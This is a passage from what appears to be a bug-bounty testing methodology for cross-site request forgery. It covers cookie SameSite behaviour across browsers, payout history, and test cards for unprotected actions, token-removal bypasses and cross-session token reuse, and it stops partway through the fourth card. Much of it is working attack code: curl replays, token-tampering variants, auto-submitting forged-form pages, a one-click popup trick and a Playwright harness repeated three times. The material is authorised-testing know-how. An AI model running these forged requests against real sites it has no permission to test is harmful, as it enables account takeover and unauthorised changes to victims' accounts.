# CSR · Cross-site request forgery

> A page on another site makes the victim's browser send a request that the application accepts as the
> victim's own. It pays when that request changes who controls the account or where its data goes: the e-mail,
> password or second factor, a linked identity or integration, a role, a key. A missing token on a harmless
> action, login CSRF and logout CSRF are excluded or rated low almost everywhere, and the browsers' SameSite
> defaults now stop many textbook cases before the server sees them.

| | |
|---|---|
| **Class** | `csrf` |
| **Applies when** | http, app\|api, cookie-auth, state-change |
| **Pays** | 556 disclosed reports, 99 paid, median $300, top $10,000. The best-paid ones defeated the token or Origin check of a sensitive console or dashboard, ran state changes over GET, or attached an integration or identity to the victim's account; the long tail is a missing token on one form. |
| **Weaknesses** | Cross-Site Request Forgery (CSRF) · CWE-352 · Origin Validation Error · CWE-346 · CWE-1275 (SameSite attribute) |

## Why it pays

A CSRF report is worth what the forged request does. The money is in requests that change who controls the
account or where its data goes: the e-mail, password or second factor, where one page visit is account takeover;
a linked identity or integration (#170552, $2,500: Slack integration setup with no CSRF protection); an
administrative console (#1497169, $10,000: a path traversal that bypassed the CSRF protection of the GitHub
Enterprise management console); a deployment system (#2326194, $4,660: Argo CD's API forged from HTML on the
same parent domain, ending in cluster compromise). Next come broken defences on large products: token
validation switched off by a deploy (#1493437, $2,500), an Origin check that let requests without an `Origin`
header through (#1543234, $2,500), GraphQL mutations accepted over GET (#1122408, $3,370), a script response
that handed the victim's data to any page that included it (#450796, $3,500). The long tail is $100 to $300 for
a missing token on one form, and login CSRF rated low (#834366, $500). CSRF through mobile deep links pays well
(#805073, $2,940) but belongs to the mobile methodology, not this chapter.

Browsers changed the class in 2020. Chromium treats a cookie without a `SameSite` attribute as `Lax`, which
stops cross-site POSTs for every application that never set the attribute; Firefox and Safari have not adopted
that default. `SameSite` is decided per site, not per origin, so every sibling host under the same registrable
domain is inside the fence. The first question on each asset is therefore what B's session cookie does in each
engine (CSR-001); the answer decides which cards can end in a proof.

## The crux question

**Which request that matters will B's browser send, with B's cookies attached, when a page on another site asks
it to, and does that request carry anything the attacker cannot know?**

## Applicability probe

Settle `cookie-auth` and `state-change` for the asset, and record the cookie attributes every proof needs.

```bash
source "$E/env.sh"; D="$E/evidence/$H/CSR-probe"; mkdir -p "$D"
# 1. the session rides in a cookie: an authenticated read from the map with the cookie alone, then with the Authorization header alone
grep -i '^cookie:' "$E/accounts/B.headers" > "$D/cookie.headers"; grep -i '^authorization:' "$E/accounts/B.headers" > "$D/authz.headers"
for f in cookie authz; do curl -sS "${HDR[@]}" -H @"$D/$f.headers" -o /dev/null -w "$f only: %{http_code}\n" "$T/api/me"; done
# 2. authenticated state-changing requests in the map, and the anti-CSRF material they carry
grep -l -E '^(POST|PUT|PATCH|DELETE) ' "$E/recon/$H/requests/"*.http | wc -l
cat "$E/recon/$H/requests/"*.http | grep -i -o -E '^(x-csrf-token|x-xsrf-token|x-csrftoken|x-requested-with):|(authenticity_token|csrfmiddlewaretoken|_csrf|_token|csrf_token)=' | sort | uniq -c
# 3. the Set-Cookie lines that created B's session: every proof page loads B's cookies with these attributes (CSR-001, step 1)
grep -i -c '^set-cookie' "$E/accounts/B.set-cookie" 2>/dev/null || echo 'missing: CSR-001 step 1 records them'
```

```bash
scripts/sane fact set "$H" cookie-auth=1 state-change=1 --ev "cookie alone authenticates /api/me (200), Authorization alone 401; 14 POST/PATCH requests in recon/$H/requests"
# the session is a bearer token the front end adds, and the cookie alone is refused:
scripts/sane fact set "$H" cookie-auth=0 --ev "SPA sends Authorization: Bearer from localStorage; cookie-only replay of /api/me is 401"
```

With `cookie-auth` false the chapter closes for the asset: a browser attaches no bearer token to a request
another site starts. Browser-managed HTTP authentication (Basic, Digest, NTLM, client certificates) is also sent
on cross-site requests, but the vocabulary has no fact for it; note such an asset in `notes.md` for the operator.

## Triage order

CSR-001 (which requests carry B's cookie, in which engine) → CSR-002 (a sensitive request with no defence) →
CSR-003 (token removed or any value) → CSR-005 (the same action over GET) → CSR-006 (Origin or Referer check
fooled) → CSR-004 (A's token on B's request) → CSR-007 (exempt routes and hosts) → CSR-008 (every bypass aimed
at e-mail, password and second factor) → CSR-009 (account linking and integrations) → CSR-012 (token or data
read through a script tag) → CSR-011 (same-site foothold) → CSR-010 (login CSRF, often excluded).

## Items

### CSR-001 · The session cookie rides a top-level POST that another site starts, in at least one current browser engine

| | |
|---|---|
| **Severity** | None standalone; decides which items can end in a proof, and in which browsers |
| **Requires** | account, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Cross-Site Request Forgery (CSRF) · CWE-352, CWE-1275 |
| **Prior art** | #1113559, #975983, #3253725 |

- **Where:** every cookie the session needs. Delete cookies from a copy of `$E/accounts/B.headers` one at a
  time until an authenticated read (`$T/api/me`, the account page) stops working; the ones that matter remain.
  Their attributes are on the `Set-Cookie` line that created them, in B's login or SSO-callback response. A
  session that is re-issued on every response shows them on any page.
- **Test:** the `SameSite` attribute decides what another site can make the browser send. `None` (requires
  `Secure`): every cross-site request, except that Firefox partitions and Safari blocks cookies on cross-site
  subresources (`<img>`, `fetch`, `<script>`, frames); top-level navigations carry it in every engine. `Lax`:
  top-level GET navigations only (a link, `location =`, a GET form). `Strict`: nothing another site starts. No
  attribute: Chromium treats it as `Lax`, except that a cookie younger than two minutes still rides a cross-site
  top-level POST; Firefox and Safari have not adopted that default. Measure it with probe pages in all three
  engines instead of reading it off the header.
- **How:**
  ```bash
  D="$E/evidence/$H/CSR-001"; mkdir -p "$D"
  # 0. which cookies carry the session: drop one at a time from B's Cookie line and see which drop breaks an authenticated read
  CK=$(grep -i '^cookie:' "$E/accounts/B.headers" | sed -E 's/^[^:]*: *//')
  for k in $(printf '%s' "$CK" | tr ';' '\n' | sed 's/^ *//; s/=.*//'); do
    printf 'Cookie: %s\n' "$(printf '%s' "$CK" | tr ';' '\n' | sed 's/^ *//' | grep -v "^$k=" | paste -sd ';' -)" > "$D/without.cookie"
    curl -sS "${HDR[@]}" -H @"$D/without.cookie" -o /dev/null -w "without $k: %{http_code}\n" "$T/api/me"; sleep 1; done
  # 1. the Set-Cookie lines that create B's session, kept next to B.headers: every CSR proof loads cookies with these attributes.
  #    Best source: a fresh login of B (field names and any login token come from login.html); fallback: a response that re-issues them.
  curl -sS "${HDR[@]}" $B -D- -o /dev/null "$T/" | grep -i '^set-cookie' | tee "$D/any-page.set-cookie"
  curl -sS "${HDR[@]}" -c "$D/login.jar" -o "$D/login.html" "$T/login"
  curl -sS "${HDR[@]}" -b "$D/login.jar" -c "$D/login.jar" -D- -o /dev/null -X POST "$T/login" --data-urlencode 'email=<B e-mail>' \
    --data-urlencode 'password=<B password>' | grep -i '^set-cookie' | tee "$D/login.set-cookie"
  [ -s "$D/login.set-cookie" ] && cp "$D/login.set-cookie" "$E/accounts/B.set-cookie" || cp "$D/any-page.set-cookie" "$E/accounts/B.set-cookie"
  curl -sS "${HDR[@]}" $B -o /dev/null -w 'old B session after the new login: %{http_code}\n' "$T/api/me"
  #    not 200: the new login ended the old session; put these new values into B.headers
  printf 'Cookie: %s\n' "$(sed 's/^#HttpOnly_//' "$D/login.jar" | grep -v '^#' | awk 'NF>=7{printf "%s%s=%s", s, $6, $7; s="; "}')" > "$D/new-cookie.line"
  # 2. victim browser: the same block in every CSR card, written once per engagement (Playwright for Python)
  mkdir -p "$E/tools"; [ -s "$E/tools/csrf-fire.py" ] || cat > "$E/tools/csrf-fire.py" <<'PY'
  # csrf-fire.py <page> <evidence dir> <chromium|firefox|webkit> [the HDR arguments]
  # B in a fresh normal browser profile: B's cookies (accounts/B.headers) with the attributes of their real Set-Cookie
  # lines (accounts/B.set-cookie). <page> is a file in the evidence dir, served from 127.0.0.1 on a free port (another
  # site), or a full URL in which PORT becomes that port. Appends every request the page causes to the target to browser.log.
  import functools, http.server, os, re, sys, tempfile, threading, time
  from playwright.sync_api import sync_playwright
  page, d, eng, *h = sys.argv[1:]; E, T = os.environ['E'], os.environ['T']; host = T.split('/')[2]
  os.path.exists(E + '/accounts/B.set-cookie') or sys.exit("accounts/B.set-cookie is missing: save there the Set-Cookie lines of B's login response (CSR-001, step 1)")
  class Q(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):   # pages only: any other path (the /leak beacon of CSR-012) is logged and answered 404
          return super().do_GET() if self.path.split('?')[0].endswith('.html') else self.send_error(404)
      def log_message(self, f, *a): open(d + '/server.log', 'a').write(f % a + '\n')
  srv = http.server.ThreadingHTTPServer(('127.0.0.1', 0), functools.partial(Q, directory=d))
  threading.Thread(target=srv.serve_forever, daemon=True).start(); port = srv.server_address[1]
  url = page.replace('PORT', str(port)) if '://' in page else f'http://127.0.0.1:{port}/{page}'
  sc = {k: v.lower() for k, v in re.findall(r'(?im)^set-cookie:\s*([^=\s]+)=(.*)$', open(E + '/accounts/B.set-cookie').read())}
  jar = [x.strip().partition('=') for x in re.search(r'(?im)^cookie:(.*)$', open(E + '/accounts/B.headers').read()).group(1).split(';') if '=' in x]
  ck = [dict(name=k, value=v, url=T, httpOnly='httponly' in sc[k], **{'sameSite': s.title() for s in re.findall(r'samesite=(lax|strict|none)', sc[k])})
        for k, _, v in jar if k in sc]
  print('not loaded (no Set-Cookie line):', ' '.join(k for k, _, v in jar if k not in sc) or '-')
  W = int(os.environ.get('LAXWAIT', 130)) if eng == 'chromium' and any('sameSite' not in c for c in ck) else 0
  hd = dict(map(str.strip, h[i + 1].split(':', 1)) for i in range(len(h) - 1) if h[i] == '-H')
  with sync_playwright() as p, tempfile.TemporaryDirectory() as prof:
      c = getattr(p, eng).launch_persistent_context(prof, user_agent=h[h.index('-A') + 1] if '-A' in h else None, extra_http_headers=hd)
      c.add_cookies(ck); time.sleep(W)   # Chromium sends a cookie without SameSite on cross-site POSTs for 2 minutes after it is set
      seen = []; c.on('request', seen.append); pg = c.new_page()
      try: pg.goto(url, wait_until='commit')
      except Exception as e: print(e)
      pg.wait_for_timeout(6000); pg.screenshot(path=f'{d}/{eng}-{int(time.time())}.png')
      with open(d + '/browser.log', 'a') as f:
          for r in [r for r in seen if r.url.split('/')[2:3] == [host]]:
              a, s = r.all_headers(), r.response()
              sent = ' '.join(sorted(x.split('=')[0].strip() for x in a.get('cookie', '').split(';') if '=' in x)) or '-'
              f.write(f"{eng}+{W}s {r.method} {r.url} status={s.status if s else '-'} cookies={sent} origin={a.get('origin', '-')} referer={a.get('referer', '-')}\n")
      c.close()
  PY
  # 3. probe pages: which requests from another site carry the cookie (the probe path does not exist on the target)
  cat > "$D/get.html" <<EOF
  <!doctype html><title>CSR-001 GET</title><img src="$T/csr001-probe?via=img">
  <script>fetch("$T/csr001-probe?via=fetch", {mode: "no-cors", credentials: "include"});
  setTimeout(function () { location = "$T/csr001-probe?via=top-get"; }, 1500);</script>
  EOF
  cat > "$D/post.html" <<EOF
  <!doctype html><title>CSR-001 POST</title>
  <form method="POST" action="$T/csr001-probe?via=top-post"><input type="hidden" name="csr001" value="1"></form>
  <script>HTMLFormElement.prototype.submit.call(document.forms[0]);</script>
  EOF
  # 4. each engine opens both pages from another site (the harness serves them on 127.0.0.1); Chromium's POST once more inside the two-minute window
  for e in chromium firefox webkit; do for g in get post; do python3 "$E/tools/csrf-fire.py" "$g.html" "$D" $e "${HDR[@]}"; done; done
  LAXWAIT=0 python3 "$E/tools/csrf-fire.py" post.html "$D" chromium "${HDR[@]}"
  grep -o -E '^[a-z]+\+[0-9]+s [A-Z]+ [^ ]*via=[a-z-]+ status=[^ ]+ cookies=[^ ]*' "$D/browser.log"
  ```
- **Proof:** none on its own: this is the measurement every other card relies on. Keep the table from
  `browser.log` (for each engine, which of `img`, `fetch`, `top-get` and `top-post` carried the session cookie,
  and Chromium's `top-post` at `+0s` and at `+130s`) next to the `Set-Cookie` line, and park it with that summary:
  `scripts/sane mark "$H" CSR-001 parked --note "sid has no SameSite: top-post carries it in firefox and webkit, in chromium only at +0s; top-get in all three" --ev "$D/browser.log"`.
- **Not a finding when:** a missing, `None` or `Lax` attribute is not a vulnerability; reported alone it is
  `missing-headers`. A run in which a proxy, `extra_http_headers` or a hand-set `Cookie` header supplied the
  cookie proves nothing: such a cookie travels on every request whatever its attributes. A cookie that is sent
  but does not authenticate (analytics, a load-balancer pin, the CSRF cookie itself) does not count; only the
  cookies found under **Where** do. A Chromium result at `+0s` alone describes a victim who signed in two minutes
  ago, not a typical one. `not loaded` naming a session cookie means `B.set-cookie` lacks its line: fix that
  before reading the table.
- **Escalate:** `None`, or no attribute (Firefox and Safari): the POST cards CSR-002, CSR-003, CSR-004, CSR-006,
  CSR-007 and CSR-008. `Lax`: GET actions (CSR-005), OAuth callbacks (CSR-009) and same-site requests (CSR-011).
  No attribute in Chromium: the two-minute window becomes usable with a route that re-issues the session cookie
  on a top-level GET (an SSO round trip that completes silently while the victim is signed in at the IdP, a
  session-refresh endpoint): the page opens it in a popup on the victim's click, then submits the form,
  `onclick = () => { open('<refresh URL>'); setTimeout(() => HTMLFormElement.prototype.submit.call(document.forms[0]), 5000); }`,
  and the report says "one click". `Strict`: CSR-011, and a redirect performed by the target's own script (a
  navigation the target's page starts is same-site and carries `Strict` cookies: RDR chapter).

### CSR-002 · A state-changing request carries nothing secret, so a form on another site repeats it with the victim's cookies

| | |
|---|---|
| **Severity** | Medium standalone for a change in the victim's account; High when the forged action grants access or moves value (API key, webhook, member or role, payout destination, an admin's setting); Low for preferences |
| **Requires** | account, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Cross-Site Request Forgery (CSRF) · CWE-352 |
| **Prior art** | #1493437, #1087436, #343120 |

- **Where:** the state-changing requests saved during mapping (`$E/recon/$H/requests/*.http`), most sensitive
  first: account and security settings (the takeover ones are CSR-008), team members and roles, API keys and
  OAuth apps, webhooks and integrations, billing and payout details, publishing and deletion, an admin's settings
  when we hold an admin account. Also older hosts and microsites that receive the same cookie through its
  `Domain` attribute: a forgotten one often has no defence at all (#343120).
- **Test:** without a CORS preflight, a page on another site can send GET, HEAD and POST with only CORS-safelisted
  headers and a body of type `application/x-www-form-urlencoded`, `multipart/form-data` or `text/plain`; a form
  does it as a top-level navigation. Anything else (PUT, PATCH, DELETE, `application/json`, an `X-CSRF-Token` or
  `X-Requested-With` header) needs a preflight that the server must approve, so the browser never sends it. Strip
  from the saved request everything a page cannot send or know, replay it with B's cookies alone, and read the
  state back.
- **How:**
  ```bash
  D="$E/evidence/$H/CSR-002"; mkdir -p "$D"; C="$D/B-cookie.headers"; grep -i '^cookie:' "$E/accounts/B.headers" > "$C"
  # 1. what each saved state-changing request carries besides cookies: content type, custom headers, token fields
  for f in "$E/recon/$H/requests/"*.http; do head -1 "$f" | grep -q -E '^(POST|PUT|PATCH|DELETE) ' || continue
    printf '%s | %s | %s\n' "$(head -1 "$f" | tr -d '\r')" \
      "$(grep -i -o -E '^(content-type|x-[a-z-]*(csrf|xsrf|token|requested-with)[a-z-]*): *[^;]*' "$f" | tr -d '\r' | paste -sd ' ')" \
      "$(grep -i -o -E '(csrf|xsrf|authenticity|_token|nonce|verificationtoken)[a-z_]*' "$f" | sort -u | paste -sd ' ')"
  done | tee "$D/requests.txt"
  # 2. one of them with the cookie alone and the body a form would send, then the state read back as B
  U="$T/settings/profile"
  curl -sS "${HDR[@]}" -H @"$C" -X POST "$U" --data-urlencode 'bio=csr002-cookie-only' -o "$D/replay.body" -w 'cookie only: %{http_code}\n'
  curl -sS "${HDR[@]}" $B "$U" | grep -o 'csr002-cookie-only' || echo 'state unchanged'
  # 3. the page another site serves (an upload or import action: poc-upload.html below)
  cat > "$D/poc.html" <<EOF
  <!doctype html><meta charset="utf-8"><title>CSR-002</title>
  <form method="POST" action="$U"><input type="hidden" name="bio" value="csr002-csrf"></form>
  <script>HTMLFormElement.prototype.submit.call(document.forms[0]);</script>
  EOF
  cat > "$D/poc-upload.html" <<EOF
  <!doctype html><meta charset="utf-8"><title>CSR-002 upload</title>
  <form method="POST" action="$T/settings/avatar" enctype="multipart/form-data"><input type="file" name="avatar"></form>
  <script>var t = new DataTransfer(); t.items.add(new File(["csr002"], "csr002.txt", {type: "text/plain"}));
  document.forms[0].avatar.files = t.files; HTMLFormElement.prototype.submit.call(document.forms[0]);</script>
  EOF
  # 4. victim browser: the same block in every CSR card, written once per engagement (Playwright for Python)
  mkdir -p "$E/tools"; [ -s "$E/tools/csrf-fire.py" ] || cat > "$E/tools/csrf-fire.py" <<'PY'
  # csrf-fire.py <page> <evidence dir> <chromium|firefox|webkit> [the HDR arguments]
  # B in a fresh normal browser profile: B's cookies (accounts/B.headers) with the attributes of their real Set-Cookie
  # lines (accounts/B.set-cookie). <page> is a file in the evidence dir, served from 127.0.0.1 on a free port (another
  # site), or a full URL in which PORT becomes that port. Appends every request the page causes to the target to browser.log.
  import functools, http.server, os, re, sys, tempfile, threading, time
  from playwright.sync_api import sync_playwright
  page, d, eng, *h = sys.argv[1:]; E, T = os.environ['E'], os.environ['T']; host = T.split('/')[2]
  os.path.exists(E + '/accounts/B.set-cookie') or sys.exit("accounts/B.set-cookie is missing: save there the Set-Cookie lines of B's login response (CSR-001, step 1)")
  class Q(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):   # pages only: any other path (the /leak beacon of CSR-012) is logged and answered 404
          return super().do_GET() if self.path.split('?')[0].endswith('.html') else self.send_error(404)
      def log_message(self, f, *a): open(d + '/server.log', 'a').write(f % a + '\n')
  srv = http.server.ThreadingHTTPServer(('127.0.0.1', 0), functools.partial(Q, directory=d))
  threading.Thread(target=srv.serve_forever, daemon=True).start(); port = srv.server_address[1]
  url = page.replace('PORT', str(port)) if '://' in page else f'http://127.0.0.1:{port}/{page}'
  sc = {k: v.lower() for k, v in re.findall(r'(?im)^set-cookie:\s*([^=\s]+)=(.*)$', open(E + '/accounts/B.set-cookie').read())}
  jar = [x.strip().partition('=') for x in re.search(r'(?im)^cookie:(.*)$', open(E + '/accounts/B.headers').read()).group(1).split(';') if '=' in x]
  ck = [dict(name=k, value=v, url=T, httpOnly='httponly' in sc[k], **{'sameSite': s.title() for s in re.findall(r'samesite=(lax|strict|none)', sc[k])})
        for k, _, v in jar if k in sc]
  print('not loaded (no Set-Cookie line):', ' '.join(k for k, _, v in jar if k not in sc) or '-')
  W = int(os.environ.get('LAXWAIT', 130)) if eng == 'chromium' and any('sameSite' not in c for c in ck) else 0
  hd = dict(map(str.strip, h[i + 1].split(':', 1)) for i in range(len(h) - 1) if h[i] == '-H')
  with sync_playwright() as p, tempfile.TemporaryDirectory() as prof:
      c = getattr(p, eng).launch_persistent_context(prof, user_agent=h[h.index('-A') + 1] if '-A' in h else None, extra_http_headers=hd)
      c.add_cookies(ck); time.sleep(W)   # Chromium sends a cookie without SameSite on cross-site POSTs for 2 minutes after it is set
      seen = []; c.on('request', seen.append); pg = c.new_page()
      try: pg.goto(url, wait_until='commit')
      except Exception as e: print(e)
      pg.wait_for_timeout(6000); pg.screenshot(path=f'{d}/{eng}-{int(time.time())}.png')
      with open(d + '/browser.log', 'a') as f:
          for r in [r for r in seen if r.url.split('/')[2:3] == [host]]:
              a, s = r.all_headers(), r.response()
              sent = ' '.join(sorted(x.split('=')[0].strip() for x in a.get('cookie', '').split(';') if '=' in x)) or '-'
              f.write(f"{eng}+{W}s {r.method} {r.url} status={s.status if s else '-'} cookies={sent} origin={a.get('origin', '-')} referer={a.get('referer', '-')}\n")
      c.close()
  PY
  # 5. B's browser opens the page from another origin, once per engine, each run with its own marker (an upload action: the same loop on poc-upload.html)
  for e in chromium firefox webkit; do sed "s/csr002-csrf/csr002-$e/" "$D/poc.html" > "$D/poc-$e.html"
    python3 "$E/tools/csrf-fire.py" "poc-$e.html" "$D" $e "${HDR[@]}"
    echo "$e: $(curl -sS "${HDR[@]}" $B "$U" | grep -o "csr002-$e" || echo unchanged)"; done
  cat "$D/browser.log"
  ```
- **Proof:** B's account showing `csr002-<engine>` after B's browser opened the page from
  `http://127.0.0.1:<port>`, next to the value before; `poc.html`; the `browser.log` line with the POST, B's
  session cookie among `cookies=` and the foreign `origin=`; the session cookie's `Set-Cookie` line; the engines
  that worked. Before reporting, open the page once in an ordinary desktop browser where B signed in by hand more
  than two minutes earlier (programme headers added the way the policy asks), and name that browser and version
  in the report.
- **Not a finding when:** the cookie-only replay needed a token or custom header after all (CSR-003, CSR-004). The
  replay works but no browser sends the cookie on the page's request (CSR-001 found `Lax` or `Strict`: CSR-005 and
  CSR-011 remain). The request is JSON or carries a custom header and every simple variant is refused: only the
  content-type and GraphQL tricks remain, which are API-006 and GQL-008 and are not repeated here. A 200 or a
  redirect with no change: read the state, never trust the status (Rails `null_session` runs the action as an
  anonymous user). The change waits for a confirmation B must give. The action changes nothing that matters
  (`csrf-low`: preferences, newsletter, language, cart, like or follow on most programmes). A site-wide missing
  token is one report, not one per form.
- **Escalate:** CSR-008 for the e-mail, password and second factor. A field the forged request sets that renders
  unescaped turns a self-XSS into stored XSS in B's account (XSS chapter). An admin action forged on our own admin
  account (ADM) that grants a role to A is privilege escalation (BAC chapter).

### CSR-003 · The server accepts the state change when the anti-CSRF token is removed, emptied or replaced with any value

| | |
|---|---|
| **Severity** | Medium standalone for a change in the victim's account; High for account-level and access-granting actions; Low for preferences |
| **Requires** | account, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | low |
| **Weakness** | Cross-Site Request Forgery (CSRF) · CWE-352 |
| **Prior art** | #994504, #742, #99857, #86022 |

- **Where:** requests that carry a token field (`authenticity_token`, `csrfmiddlewaretoken`, `_token`, `_csrf`,
  `__RequestVerificationToken`, `csrf_token`, a `hash` or `nonce`) or a token header (`X-CSRF-Token`,
  `X-XSRF-TOKEN`, `X-CSRFToken`); CSR-002's `requests.txt` lists them. Secondary routes of the same action (a
  password-reset page, sign-up, a settings sub-page, the mobile form) are checked less carefully than the main
  form (#742).
- **Test:** the check often runs only when the field is present, compares only length or format, or compares
  loosely. Send the action with the token valid (control), removed, empty, random of the same length, and as an
  array; for a header token, with the header valid, with a random value, and absent. Every variant goes with B's
  cookies alone, and the state is read back after each.
- **How:**
  ```bash
  D="$E/evidence/$H/CSR-003"; mkdir -p "$D"; C="$D/B-cookie.headers"; grep -i '^cookie:' "$E/accounts/B.headers" > "$C"
  U="$T/settings/profile"; F=authenticity_token; TH=X-CSRF-Token     # the token field and header this app uses (from the saved request)
  TOK=$(curl -sS "${HDR[@]}" $B "$U" | grep -o -E "name=\"($F|csrf-token)\"[^>]*(value|content)=\"[^\"]*\"" | head -1 | sed -E 's/.*(value|content)="([^"]*)"$/\2/')
  RND=$(head -c 300 /dev/urandom | base64 | tr -dc 'A-Za-z0-9' | head -c "${#TOK}"); echo "token: ${#TOK} characters"
  try(){ n=$1; shift; curl -sS "${HDR[@]}" -H @"$C" -X POST "$U" "$@" --data-urlencode "bio=csr003-$n" -o "$D/$n.body" -w "$n %{http_code} -> "
         curl -sS "${HDR[@]}" $B "$U" | grep -o "csr003-$n" || echo unchanged; sleep 1; }
  try control --data-urlencode "$F=$TOK"       # must change the state, or the field name or the endpoint is wrong
  try removed
  try empty   --data-urlencode "$F="
  try random  --data-urlencode "$F=$RND"
  try array   --data-urlencode "${F}[]=$RND"
  try header-control -H "$TH: $TOK"            # header tokens: valid, then random; "removed" above already sent none
  try header-random  -H "$TH: $RND"
  # the page: the variant that changed the state (here "removed"; for "empty" or "random" add the input with that value)
  cat > "$D/poc.html" <<EOF
  <!doctype html><meta charset="utf-8"><title>CSR-003</title>
  <form method="POST" action="$U"><input type="hidden" name="bio" value="csr003-csrf"></form>
  <script>HTMLFormElement.prototype.submit.call(document.forms[0]);</script>
  EOF
  # victim browser: the same block in every CSR card, written once per engagement (Playwright for Python)
  mkdir -p "$E/tools"; [ -s "$E/tools/csrf-fire.py" ] || cat > "$E/tools/csrf-fire.py" <<'PY'
  # csrf-fire.py <page> <evidence dir> <chromium|firefox|webkit> [the HDR arguments]
  # B in a fresh normal browser profile: B's cookies (accounts/B.headers) with the attributes of their real Set-Cookie
  # lines (accounts/B.set-cookie). <page> is a file in the evidence dir, served from 127.0.0.1 on a free port (another
  # site), or a full URL in which PORT becomes that port. Appends every request the page causes to the target to browser.log.
  import functools, http.server, os, re, sys, tempfile, threading, time
  from playwright.sync_api import sync_playwright
  page, d, eng, *h = sys.argv[1:]; E, T = os.environ['E'], os.environ['T']; host = T.split('/')[2]
  os.path.exists(E + '/accounts/B.set-cookie') or sys.exit("accounts/B.set-cookie is missing: save there the Set-Cookie lines of B's login response (CSR-001, step 1)")
  class Q(http.server.SimpleHTTPRequestHandler):
      def do_GET(self):   # pages only: any other path (the /leak beacon of CSR-012) is logged and answered 404
          return super().do_GET() if self.path.split('?')[0].endswith('.html') else self.send_error(404)
      def log_message(self, f, *a): open(d + '/server.log', 'a').write(f % a + '\n')
  srv = http.server.ThreadingHTTPServer(('127.0.0.1', 0), functools.partial(Q, directory=d))
  threading.Thread(target=srv.serve_forever, daemon=True).start(); port = srv.server_address[1]
  url = page.replace('PORT', str(port)) if '://' in page else f'http://127.0.0.1:{port}/{page}'
  sc = {k: v.lower() for k, v in re.findall(r'(?im)^set-cookie:\s*([^=\s]+)=(.*)$', open(E + '/accounts/B.set-cookie').read())}
  jar = [x.strip().partition('=') for x in re.search(r'(?im)^cookie:(.*)$', open(E + '/accounts/B.headers').read()).group(1).split(';') if '=' in x]
  ck = [dict(name=k, value=v, url=T, httpOnly='httponly' in sc[k], **{'sameSite': s.title() for s in re.findall(r'samesite=(lax|strict|none)', sc[k])})
        for k, _, v in jar if k in sc]
  print('not loaded (no Set-Cookie line):', ' '.join(k for k, _, v in jar if k not in sc) or '-')
  W = int(os.environ.get('LAXWAIT', 130)) if eng == 'chromium' and any('sameSite' not in c for c in ck) else 0
  hd = dict(map(str.strip, h[i + 1].split(':', 1)) for i in range(len(h) - 1) if h[i] == '-H')
  with sync_playwright() as p, tempfile.TemporaryDirectory() as prof:
      c = getattr(p, eng).launch_persistent_context(prof, user_agent=h[h.index('-A') + 1] if '-A' in h else None, extra_http_headers=hd)
      c.add_cookies(ck); time.sleep(W)   # Chromium sends a cookie without SameSite on cross-site POSTs for 2 minutes after it is set
      seen = []; c.on('request', seen.append); pg = c.new_page()
      try: pg.goto(url, wait_until='commit')
      except Exception as e: print(e)
      pg.wait_for_timeout(6000); pg.screenshot(path=f'{d}/{eng}-{int(time.time())}.png')
      with open(d + '/browser.log', 'a') as f:
          for r in [r for r in seen if r.url.split('/')[2:3] == [host]]:
              a, s = r.all_headers(), r.response()
              sent = ' '.join(sorted(x.split('=')[0].strip() for x in a.get('cookie', '').split(';') if '=' in x)) or '-'
              f.write(f"{eng}+{W}s {r.method} {r.url} status={s.status if s else '-'} cookies={sent} origin={a.get('origin', '-')} referer={a.get('referer', '-')}\n")
      c.close()
  PY
  for e in chromium firefox webkit; do sed "s/csr003-csrf/csr003-$e/" "$D/poc.html" > "$D/poc-$e.html"
    python3 "$E/tools/csrf-fire.py" "poc-$e.html" "$D" $e "${HDR[@]}"
    echo "$e: $(curl -sS "${HDR[@]}" $B "$U" | grep -o "csr003-$e" || echo unchanged)"; done
  cat "$D/browser.log"
  ```
- **Proof:** the `try` lines: the control and the variant that changed B's state, with their saved bodies; then the
  page without a usable token changing B's account from another site, with `browser.log`, the cookie's
  `Set-Cookie` line and the engines that worked, re-checked once in an ordinary desktop browser.
- **Not a finding when:** the control fails (wrong field or endpoint, or the action wants JSON: API-006). Every
  variant is refused with the control's error. A variant answers 200 or redirects but the state did not move:
  some frameworks answer a failed check by running the action without a session or by logging the user out, so
  only the state read back counts. The token is checked at a later step of the same flow. The action is not
  sensitive (`csrf-low`).
- **Escalate:** CSR-008 in the accepted shape. A valid token that is not tied to the session is CSR-004. PHP back
  ends that compare with `==` or `strcmp`: `token[]=` (an array; `strcmp` returns null before PHP 8) and, where a
  JSON body reaches the check, `"token": true`, which loosely equals any non-empty string (#86022 is a
  type-juggling bypass of a CSRF token check).

### CSR-004 · An anti-CSRF token issued to the attacker's session is accepted on the victim's request

| | |
|---|---|
| **Severity** | Medium standalone for a change in the victim's account; High for account-level and access-granting actions; None while a double-submit cookie has no way into the victim's browser |
| **Requires** | two-accounts, browser |
| **Excluded by** | — |
| **Unit** | deployment |
| **Cost** | medium |
| **Weakness** | Cross-Site Request Forgery (CSRF) · CWE-352 |
| **Prior art** | #2513333, #315524, #1044933, #55911 |

- **Where:** token-protected requests whose token CSR-003 could not remove. Three shapes: a token valid for any
  session (a pool, a static value, a token signed without the user in it); a double submit, where the token is
  compared with a cookie (`csrftoken`, `XSRF-TOKEN`, `_csrf`) instead of with the session; and a token tied to an
  object instead of a user, the same for every member of a group or conversation (#315524).
- **Test:** A's own token is something the attacker has. Put it on B's request with B's session. If the server
  compares the token with a cookie only, B's session cookie plus A's CSRF cookie plus A's token passes too, and
  the attack then needs a way to set that cookie in B's browser. For a token that changes with a group or project
  id, put A and B in the same group and compare their tokens for one action.
- **How:**
  ```bash
  D="$E/evidence/$H/CSR-004"; mkdir -p "$D"; U="$T/settings/profile"; F=authenticity_token   # the token field (from the saved request)
  tok(){ curl -sS "${HDR[@]}" "$@" "$U" | grep -o -E "name=\"($F|csrf-token)\"[^>]*(value|content)=\"[^\"]*\"" | head -1 | sed -E 's/.*(value|content)="([^"]*)"$/\2/'; }
  TA=$(tok $A); TB=$(tok $B); printf 'A %s\nB %s\n' "$TA" "$TB" | tee "$D/tokens.txt"      # equal: one token for everyone
  st(){ curl -sS "${HDR[@]}" $B "$U" | grep -o "$1" || echo unchanged; }
  BC=$(grep -i '^cookie:' "$E/accounts/B.headers" | sed -E 's/^[^:]*: *//')
  # 1. B's session carrying A's token: the attacker can put TA in the page because it is the attacker's own
